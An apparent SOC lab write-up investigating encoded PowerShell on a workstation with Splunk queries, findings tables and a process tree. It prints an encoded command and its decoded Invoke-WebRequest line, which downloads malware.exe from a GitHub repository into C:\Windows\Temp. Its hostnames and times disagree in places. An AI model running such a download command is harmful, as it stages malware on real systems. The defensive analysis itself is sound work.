## Summary
An attacker used PowerShell to compromise workstation DESKTOP-8TU4818 at SecureCode infotec. Attackers used powershell encoding to avoid detection, downloaded malware from an external server, created a secret administrator account to maintain persistence, and then started mapping out the internal network. This was a structured and deliberate attack that went undetected because there was no PowerShell monitoring in place.   

## Scenario
It is Saturday Evening at SecureCode infotec. The SIEM fires an alert about suspicious PowerShell activity on workstation DESKTOP-8TU4818. The alert shows PowerShell was launched with unusual parameters from a process. As the analyst on duty the task is to investigate whether this is a legitimate administrator or an attacker using PowerShell to compromise the machine.

## Objective
Use Splunk to investigate suspicious PowerShell execution, identify all malicious commands and techniques used, understand the full scope of the attack, and produce a clear professional report of the findings.

## Tools Used
- Splunk Enterprise
- SPL (Search Processing Language)

## Background — Why Attackers Use PowerShell
PowerShell is built into every Windows machine and is trusted by the operating system. That is exactly why attackers love it. They do not need to bring any external tools because everything they need is already there. They can download files, run code, create accounts and explore the network all through PowerShell without triggering most antivirus tools.   

## Investigation Steps
## Alert
**Name:** Suspecious PowerShell execution.
**Description** Encoded command execution detected.
**Username** Administrator
**Workstation** WKSTN-041
**Time** 09/06/2026 12:39:43.372 PM
**Process ID** 0x5dc

## Alert Investigation
As usual, I’ll start the investigation with the information provided by the alert: the username, timestamp, workstation name, and the fact that a PowerShell execution was detected.  

Since we know this is a PowerShell execution, Windows Event ID 4688 (Process Creation) is a useful starting point. Event 4688 can provide the process name, parent process, user context, and, when command-line auditing is enabled, the complete command line used to launch PowerShell.    

We can use the username, workstation, and timestamp from the alert to narrow down the search in Splunk. This should reduce the amount of unrelated activity and help us quickly identify the process that generated the alert.   
**SPL query: ** `index=Winserver host="WKSTN-041" EventCode=4688 New_Process_ID=0x5dc Account_Name="Administrator" earliest="09/06/2026:12:39:00" latest="09/06/2026:12:40:30" | table _time host Account_Name New_Process_ID New_Process_Name Creator_Process_ID Creator_Process_Name Process_Command_Line`  

!(img)[]  

The Splunk query identified a PowerShell process executed by the `Administrator` account on workstation `WKSTN-041`. The process ID `0x5dc` corresponds to the process referenced in the alert. The process command line contains an encoded PowerShell command (`-EncodedCommand`)`, indicating an attempt to obfuscate the command being executed.    

**Key Findings**   
| IOC / Observable | Value | Description |
|---|---|---|
| **Timestamp** | `2026-09-06 12:39:43.372` | Time of suspicious process execution |
| **Host** | `WKSTN-041` | Affected workstation |
| **Account** | `Administrator` | Account that executed the process |
| **Process ID** | `0x5dc` (Decimal: `1500`) | PID of the suspicious PowerShell process |
| **Process Name** | `powershell.exe` | Windows PowerShell executable |
| **Process Path** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Path of the PowerShell executable |
| **Creator Process ID** | `0xf08` (Decimal: `3848`) | PID of the parent/creator process |
| **Creator Process Name** | `powershell.exe` | Parent process |
| **Process_Command_Line** |  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA
|  Encoded Command Execution |     

## Decode Command
**Lets Decode Executed Command Using cyberchef.io**    
The decoded PowerShell command revealed an attempt to download `malware.exe` from a GitHub repository and save it to `C:\Windows\Temp\malware.exe`. The use of `-EncodedCommand`provided an additional layer of obfuscation.   

!(img)[]  

Actual Command executed was `Invoke-WebRequest -Uri "https://github.com/s-anjeev/soc-projects/blob/main/03-Malware-Analysis/case-01-powershell-dropper/sample/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"` this is confirmand by Event Code `4104` and `cyberchef`.

!(img)[]  

**Key Findings**  
- **PowerShell Web Request:** The command uses `Invoke-WebRequest` to retrieve a file from a remote GitHub repository.
- **Remote Source:** The requested resource is `malware.exe` hosted in a GitHub repository.
- **Payload:** The file being retrieved is an executable named `malware.exe`.
- **File Staging:** The downloaded executable is saved to: `C:\Windows\Temp\malware.exe`
- **Obfuscation:** The command was originally executed using PowerShell's `-EncodedCommand` parameter, which concealed the actual command from the initial process command line.


## Process Tree Analysis  
With the parent and child process IDs identified, we can now trace the execution chain to understand how the suspicious PowerShell activity originated.   
The investigation revealed the following execution chain:

explorer.exe  
PID: 0x1164  
    │  
    └── WindowsTerminal.exe    
        PID: 0xba0   
            │   
            └── powershell.exe   
                PID: 0xf08  
                    │  
                    └── powershell.exe  
                        PID: 0x5dc  
                        └── Encoded PowerShell Command     

The process creation events were correlated using the `Creator Process ID` and `New Process ID` fields. The timestamps show the following execution sequence:  

| Time | Parent Process | Parent PID | Child Process | Child PID |
|---|---|---:|---|---:|
| `12:39:24.721` | `explorer.exe` | `0x1164` | `WindowsTerminal.exe` | `0xba0` |
| `12:39:27.462` | `WindowsTerminal.exe` | `0xba0` | `powershell.exe` | `0xf08` |
| `12:39:43.372` | `powershell.exe` | `0xf08` | `powershell.exe` | `0x5dc` |   

